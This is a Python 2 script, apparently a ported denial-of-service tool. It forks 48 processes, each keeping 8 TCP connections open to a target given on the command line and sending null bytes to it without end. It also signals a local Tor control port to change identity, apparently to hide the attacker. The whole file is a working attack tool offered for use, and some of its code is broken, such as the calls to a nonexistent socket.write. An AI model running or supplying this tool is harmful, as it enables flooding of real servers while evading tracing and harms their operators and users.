# Ported to python by: Federico Apelhanz
import socket, os, sys, time

CONNECTIONS = 8
THREADS = 48

def make_socket(host,port):   
    for res in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM, 0, socket.AI_PASSIVE):
        af, socktype, proto, canonname, sa = res
        try:
            s = socket.socket(af, socktype, proto)
        except socket.error, msg:
            s = None
            continue
        try:
            s.connect(sa)
        except socket.error, msg:
            s.close()
            s = None
            continue
        break
    if s is None:
        print 'could not open socket'
        sys.exit(0)
    print 'Connected by', host, port
    return s




def attack(host, port, id):
    sockets = []
    for x in range(CONNECTIONS):
        sockets.insert(x,0)
    while True:
        for x in range(CONNECTIONS):
            if not sockets[x]:
                sockets[x] = make_socket(host,port)
            try:
                sockets[x].send("\0")
                print "[" + str(id) + ": Shake that child]\n"
            except socket.error:
                sockets[x].close()
                sockets[x] = make_socket(host,port)
        print "[" + str(id) +": Shake that child]\n"
        time.sleep(300000/1000000.0)




def cycle_identity(): 
    socket = make_socket("localhost", "9050")
    socket.write("AUTHENTICATE \"\"\n")
    while True:
        socket.write("signal NEWNYM\n\x00")
        print "[" + str(socket) + ": cycle_identity -> signal NEWNYM\n"
        time.sleep(300000/1000000.0)




def main():
    if len(sys.argv) != 3:
        cycle_identity()
    for x in range(THREADS):
        if os.fork():
            attack(sys.argv[1],int(sys.argv[2]),x)
        time.sleep(200000/1000000.0)
    return 0
 
if __name__ == "__main__":
    main()
